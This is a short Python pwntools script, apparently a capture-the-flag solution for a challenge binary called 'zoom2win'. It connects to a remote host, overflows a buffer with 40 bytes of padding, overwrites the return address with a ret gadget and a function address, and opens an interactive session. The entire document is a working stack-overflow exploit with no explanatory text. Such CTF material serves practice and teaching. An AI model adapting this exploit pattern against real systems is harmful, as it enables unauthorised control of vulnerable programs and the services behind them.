from pwn import *
p=remote('143.198.184.186',5003)
#p=process('./zoom2win')
#raw_input("DEBUG")
payload = "a"*40
payload += p64(0x000000000040101a)
payload += p64(0x401196)

p.sendline(payload)

p.interactive()